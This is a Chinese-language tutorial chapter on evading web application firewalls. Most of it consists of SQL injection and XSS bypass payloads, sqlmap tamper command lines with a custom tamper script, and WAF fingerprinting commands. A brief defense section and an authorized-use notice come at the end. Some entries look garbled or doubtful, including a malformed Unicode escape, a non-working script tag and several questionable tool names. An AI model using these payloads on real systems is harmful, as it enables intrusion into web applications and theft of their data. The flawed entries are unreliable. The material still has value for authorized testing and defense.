# Chapter 8: WAF 绕过技术

## 8.1 WAF 简介

WAF (Web Application Firewall) Web 应用防火墙，用于检测和阻止针对 Web 应用的攻击。

### 常见 WAF 类型

| 厂商 | 产品 |
|------|------|
| Cloudflare | Cloudflare WAF |
| AWS | AWS WAF |
| Impreva | Impreva WAF |
| F5 | BIG-IP ASM |
| 阿里云 | WAF |
| 腾讯云 | WAF |
| 宝塔 | BT WAF |

## 8.2 WAF 绕过原理

### 8.2.1 绕过原理

1. **WAF 规则缺陷** - 正则匹配不完善
2. **HTTP 解析差异** - 前后端解析不一致
3. **编码混淆** - 使用特殊编码绕过检测
4. **协议层绕过** - HTTP/2、HTTP/3 特性
5. **分块传输** - Transfer-Encoding 混淆

### 8.2.2 攻击面

- SQL 注入 (SQLi)
- 跨站脚本 (XSS)
- 命令注入 (CMDi)
- 文件包含 (LFI/RFI)
- XML 外部实体 (XXE)

## 8.3 SQL 注入 WAF 绕过

### 8.3.1 编码绕过

**URL 编码：**
```sql
%27 OR 1=1 --
%22%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
```

**双重 URL 编码：**
```
%2527 = '
```

**Unicode 编码：**
```
' = 'u0027
```

**Hex 编码：**
```
0x756e696f6e = union
```

**HTML 实体编码：**
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 8.3.2 注释绕过

```sql
/**/UN/**/ION/**/SELECT/**/
/*!UNION*/ /*!SELECT*/
--%0aunion--%0aselect
```

### 8.3.3 大小写混合

```sql
UniOn SeLeCT
<ScRiPt>alert('XSS')</sCrIpT>
```

### 8.3.4 关键字替换

```sql
UNION ALL SELECT
UNION SELECT DISTINCT
```

### 8.3.5 空格过滤绕过

```sql
/* */  - 注释替代空格
()      - 括号替代
%0a     - 换行符
%09     - 制表符
%0d     - 回车符
```

### 8.3.6 HTTP 参数污染 (HPP)

```http
?id=1 union&id=select&id=password
```

### 8.3.7 HTTP 参数分段 (HPF)

```http
POST /search.php
q=union/*&q=*/select/*&q=*/password
```

### 8.3.8 JSON SQL 注入

```json
{"username": "admin' OR '1'='1"}
```

### 8.3.9 方式绕过

```sql
' or 1=1-- - 正常
' or 1=1# - MySQL 注释
' or 1=1/* - 内联注释
```

## 8.4 SQLMap Tamper 脚本

### 8.4.1 常用 Tamper 脚本

| 脚本 | 作用 |
|------|------|
| space2comment | 空格替换为 /**/ |
| space2dash | 空格替换为 -- |
| space2mssqlblank | MSSQL 空格绕过 |
| between | > 替换为 BETWEEN |
| charencode | 字符编码 |
| charunicodeencode | Unicode 编码 |
| equaltolike | = 替换为 LIKE |
| greatest | > 替换为 GREATEST |
| ifnull2ifisnull | IFNULL 替换 |
| multiplespaces | 多个空格 |
| randomcase | 大小写随机 |
| randomcomments | 随机注释 |
| between | between...and... |
| apostrophemask | ' 替换为 utf8 |
| apostrophenullencode | ' 替换为 chr |

### 8.4.2 组合使用

```bash
# 组合多个 tamper
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,randomcase

# 针对特定 WAF
sqlmap -u "http://target.com?id=1" --tamper=space2comment,charencode

# 高等级测试
sqlmap -u "http://target.com?id=1" --level=5 --risk=3 --tamper=space2comment,between,randomcase
```

### 8.4.3 自定义 Tamper 脚本

```python
#!/usr/bin/env python

def tamper(payload, **kwargs):
    if payload:
        # 示例：将空格替换为 /* */
        payload = payload.replace(" ", "/**/")
    return payload
```

保存为 `mytamper.py`，使用：
```bash
sqlmap -u "http://target.com?id=1" --tamper=mytamper
```

## 8.5 XSS WAF 绕过

### 8.5.1 标签绕过

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### 8.5.2 事件绕过

```html
<svg/onload=alert('XSS')>
<img/src/onerror=alert('XSS')>
<body/onload=alert('XSS')>
```

### 8.5.3 编码绕过

```html
# Unicode 编码
\u003cscript\u003ealert('XSS')\u003c/script\u003e

# HTML 实体
&lt;script&gt;alert('XSS')&lt;/script&gt;

# Base64
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

### 8.5.4 长度绕过

```html
# 短标签
<script/alert('XSS')>
<img src=x onerror=alert('XSS')>
```

### 8.5.5 动态执行

```javascript
# eval() 绕过
eval('ale'+'rt("XSS")')

# Function 构造函数
new Function('alert("XSS")')()

# setTimeout
setTimeout('alert("XSS")',0)
```

## 8.6 常见 WAF 绕过案例

### 8.6.1 宝塔 WAF 绕过

```bash
# 使用 tamper 组合
sqlmap -u "http://target.com?id=1" --tamper=space2comment,between,charencode
```

### 8.6.2 Cloudflare 绕过

1. ** orangesec.xyz ** - 使用自定义脚本
2. ** 使用代理池**
3. ** HTTP/2 请求走私**

### 8.6.3 AWS WAF 绕过

```bash
# fuzz 测试
ffuf -w wordlist.txt -u "http://target.com/?id=1FUZZ" -mr "error"
```

## 8.7 WAF 识别

### 8.7.1 识别工具

```bash
# whatwaf
whatwaf -u http://target.com

# wafw00f
wafw00f http://target.com

# Nmap WAF 脚本
nmap --script=http-waf-detect target.com
nmap --script=http-waf-fingerprint target.com
```

### 8.7.2 手动识别

1. **查看响应头**
   - Server
   - X-Powered-By
   - Set-Cookie (cf_, akamai_)

2. **测试触发的阻止页面**
   - 提交 `' OR 1=1 --`
   - 提交 `<script>alert(1)</script>`

## 8.8 WAF 绕过工具

### 8.8.1 SQL 注入绕过

| 工具 | 说明 |
|------|------|
| SQLMap | 内置 tamper 脚本 |
| SuperSQLInjection | 自动化注入 |
| DSSS | 盲注绕过 |

### 8.8.2 XSS 绕过

| 工具 | 说明 |
|------|------|
| XSStrike | 自动化检测 |
| dalfox | Go 编写的 XSS 扫描器 |
| bfAC | XSS 暴力绕过 |

### 8.8.3 综合绕过

| 工具 | 说明 |
|------|------|
| bypass-fixedWidth4 | 多功能绕过 |
| Chankro | 编码混淆 |

## 8.9 防御 WAF 绕过

### 8.9.1 WAF 配置

1. **启用完整检测模式**
2. **自定义规则**
3. **启用攻击告警**
4. **定期规则更新**

### 8.9.2 代码层面

1. **输入验证**
2. **参数化查询**
3. **输出编码**
4. **最小权限原则**

### 8.9.3 日志监控

1. **监控异常请求**
2. **分析绕过尝试**
3. **及时更新规则**
4. **威胁情报集成**

## 8.10 注意事项

1. 仅用于授权测试
2. 遵守法律法规
3. 测试前获得授权
4. 不对目标系统造成破坏
